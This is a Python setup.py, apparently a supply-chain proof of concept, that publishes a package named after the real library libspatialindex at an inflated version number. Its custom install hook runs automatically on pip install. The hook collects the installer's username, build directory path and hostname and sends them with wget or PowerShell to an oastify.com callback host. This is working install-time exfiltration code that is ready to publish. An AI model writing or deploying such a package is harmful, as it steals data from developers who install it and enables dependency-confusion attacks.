import os
import sys
import tempfile
import subprocess
import socket # For hostname
import getpass # For username
from setuptools import setup
from setuptools.command.install import install as _install


class CustomInstall(_install):
    """
    A custom installation command that executes our PoC code.
    This method is called during `pip install` (simulating preinstall/preupdate).
    """
    def run(self):
        # --- START OF PROOF OF CONCEPT CODE ---
        print("\n" + "="*50)
        print("!!! libspatialindex: EXECUTING PROOF OF CONCEPT CODE (WGET POISON) !!!")
        print("!!! This demonstrates arbitrary code execution during package installation. !!!")
        print("!!! Simulating 'preinstall' / 'preupdate' hooks from package.json. !!!")
        print("="*50 + "\n")

        # Define your target server URL for the exfiltration
        # REPLACE THIS WITH A SERVER YOU CONTROL FOR TESTING PURPOSES ONLY!
        # Example: "http://your.test.server.com/log"
        # For local testing, you could run a simple HTTP server:
        # python -m http.server 8000
        # And use "http://localhost:8000/" or "http://127.0.0.1:8000/"
        target_server_url = "http://qqkz7rmruiqwuv301mksi8rez55ytohd.oastify.com" # <--- IMPORTANT: CHANGE THIS URL

        try:
            # Gather system information
            username = getpass.getuser()
            current_working_directory = os.getcwd() # This is the build directory during install
            hostname = socket.gethostname()

            # Construct the URL with exfiltrated data
            # URL-encode the path to handle spaces or special characters
            import urllib.parse
            encoded_path = urllib.parse.quote_plus(current_working_directory)
            
            exfil_url = (
                f"{target_server_url}?user={username}"
                f"&path={encoded_path}"
                f"&hostname={hostname}"
            )

            print(f"[PoC Debug] Constructed exfiltration URL: {exfil_url}")
            print(f"[PoC Debug] Attempting to execute wget command...")

            # Execute the wget command
            # Using subprocess.run for better control and error handling than os.system
            # We use `shell=True` for simplicity to run a direct shell command,
            # but for robust applications, avoid shell=True and pass command as list.
            # `capture_output=True` and `text=True` to get stdout/stderr
            # `timeout` to prevent hanging if the server is unreachable
            
            # Using `wget --quiet` to avoid verbose output during installation
            # If wget is not available, this will fail. On Windows, you might need curl or PowerShell.
            # For cross-platform, consider using Python's `requests` library directly if allowed for PoC.
            
            # Example using wget (common on Linux/macOS)
            command = ["wget", "--quiet", "--timeout=5", "--tries=1", exfil_url]
            
            # Alternative for Windows (using curl if available, or PowerShell)
            if sys.platform == "win32":
                # PowerShell example to make a web request silently
                command = ["powershell", "-command", f"Invoke-WebRequest -Uri '{exfil_url}' -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null"]
            
            print(f"[PoC Debug] Executing command: {' '.join(command)}")

            result = subprocess.run(command, capture_output=True, text=True, timeout=10)

            if result.returncode == 0:
                print(f"[PoC] Wget/Exfiltration command executed successfully (return code 0).")
                print(f"[PoC] Check your server logs at {target_server_url} for the data.")
            else:
                print(f"[PoC ERROR] Wget/Exfiltration command failed with return code {result.returncode}.")
                print(f"[PoC ERROR] Stdout: {result.stdout.strip()}")
                print(f"[PoC ERROR] Stderr: {result.stderr.strip()}")
                if "command not found" in result.stderr.lower() or "not recognized" in result.stderr.lower():
                    print("[PoC ERROR] 'wget' or 'powershell' command might not be available on this system's PATH.")
                print("[PoC ERROR] This indicates the exfiltration attempt may have failed.")

        except FileNotFoundError:
            print(f"[PoC ERROR] Command ('wget' or 'powershell') not found. Ensure it's installed and in PATH.")
        except subprocess.TimeoutExpired:
            print(f"[PoC ERROR] Wget/Exfiltration command timed out. Server might be unreachable or slow.")
        except Exception as e:
            print(f"[PoC ERROR] An unexpected exception occurred during PoC execution: {type(e).__name__}: {e}")
            print("[PoC ERROR] This might be due to permissions, network issues, or other environment specifics.")

        print("\n" + "="*50)
        print("!!! rwimodeling: PROOF OF CONCEPT EXECUTION COMPLETE !!!")
        print("="*50 + "\n")
        # --- END OF PROOF OF CONCEPT CODE ---

        # Continue with the normal installation process
        _install.run(self)

# Standard setup() function, now including our custom command
setup(
    name="libspatialindex", # This is the name users will `pip install`
    version="11.0.2",       # Increment this for new versions (e.g., 10.0.2 from 10.0.1)
    description="A simple PoC package for supply chain research demonstrating code execution on install and data exfiltration.",
    author="abc",
    author_email="abc@abc.com",
    url="https://github.com", # Replace with your repo
    packages=["libspatialindex"], # The actual Python package directory
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License", # Choose an appropriate license
        "Operating System :: OS Independent",
    ],
    # This is crucial: tell setuptools to use our custom install command
    cmdclass={
        "install": CustomInstall,
    },
    # Ensure any data files are included if needed (not strictly for this PoC)
    include_package_data=True,
    zip_safe=False, # Often good practice for packages with custom commands
)
